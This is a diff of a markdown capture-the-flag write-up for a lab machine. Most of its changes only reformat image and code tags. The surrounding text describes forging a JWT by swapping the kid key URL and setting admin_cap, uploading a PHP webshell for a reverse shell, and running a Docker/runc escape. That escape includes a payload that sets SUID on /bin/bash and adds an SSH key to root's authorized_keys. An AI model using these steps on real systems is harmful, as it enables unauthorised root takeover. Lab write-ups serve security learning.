@@ -19,15 +19,14 @@ PORT      STATE    SERVICE
 
 The website is a notebook website:
 
-<figure><img src="../../../.gitbook/assets/image (2636).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2636).png>)
 
 We can create a new user because we don't have any credentials. Once created, we can login and view our notes, of which we have none:
 
-<figure><img src="../../../.gitbook/assets/image (2886).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2886).png>)
 
 When the requests are viewed in Burp, we can see that it uses a JWT token and a `uuid` parameter:
 
-{% code overflow="wrap" %}
 ```http
 GET / HTTP/1.1
 Host: 10.129.71.99
@@ -41,11 +40,10 @@ Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q
 Upgrade-Insecure-Requests: 1
 
 ```
-{% endcode %}
 
 We can take a look at this cookie within jwt.io and see that it uses a private key hosted on the server.
 
-<figure><img src="../../../.gitbook/assets/image (2234).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2234).png>)
 
 The token is spoofable, similar to another machine Unicode. We can generate our own private key using `openssl` and use it to spoof the token by replacing the `kid` parameter with a link hosting the key instead. Also, we can change `admin_cap` to be 1.
 
@@ -53,35 +51,35 @@ The token is spoofable, similar to another machine Unicode. We can generate our 
 openssl genrsa -out priv.key 2048
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2323).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2323).png>)
 
 When we use this token after refreshing the page, we can see an Admin Panel present.
 
-<figure><img src="../../../.gitbook/assets/image (1161).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1161).png>)
 
 Then, we can view the notes of the administrator through Admin Panel > View Notes.
 
-<figure><img src="../../../.gitbook/assets/image (3930).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3930).png>)
 
 Conveniently, the first note reveals that PHP files are left executable on this website.
 
-<figure><img src="../../../.gitbook/assets/image (3326).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3326).png>)
 
 The admin panel also has an upload file feature:
 
-<figure><img src="../../../.gitbook/assets/image (2856).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2856).png>)
 
 I uploaded a basic PHP webshell, and the page shows this:
 
-<figure><img src="../../../.gitbook/assets/image (1130).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1130).png>)
 
 Using this, we can get RCE:
 
-<figure><img src="../../../.gitbook/assets/image (3131).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3131).png>)
 
 And subsequently, a reverse shell.
 
-<figure><img src="../../../.gitbook/assets/image (918).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(918).png>)
 
 ## Privilege Escalation
 
@@ -162,11 +160,9 @@ It seems that we can run docker as `root`. Googling for exploits pertaining to t
 
 Download this repositroy, and we can change the payload run to something else:
 
-{% code overflow="wrap" %}
 ```bash
 var payload = "#!/bin/bash \n chmod u+s /bin/bash && echo 'KEY' >> /root/.ssh/authorized_keys"
 ```
-{% endcode %}
 
 Then we can run `go build main.go` to build it. Then, following the PoC, we can create a Docker container using the `sudo` command allowed.
 
@@ -183,7 +179,6 @@ root@0f4c2517af40:/opt/webapp# ./main
 
 On a second Window, we need to run the `sudo` command one more time, and on the Docker container, it would execute properly:
 
-{% code overflow="wrap" %}
 ```
 root@0f4c2517af40:/opt/webapp# ./main 
 [+] Overwritten /bin/sh successfully
@@ -193,10 +188,9 @@ root@0f4c2517af40:/opt/webapp# ./main
 [+] The command executed is#!/bin/bash 
  chmod u+s /bin/bash && echo 'KEY' >> /root/.ssh/authorized_keys
 ```
-{% endcode %}
 
 Then, we can just `ssh` into `root`.
 
-<figure><img src="../../../.gitbook/assets/image (1358).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1358).png>)
 
 Rooted!
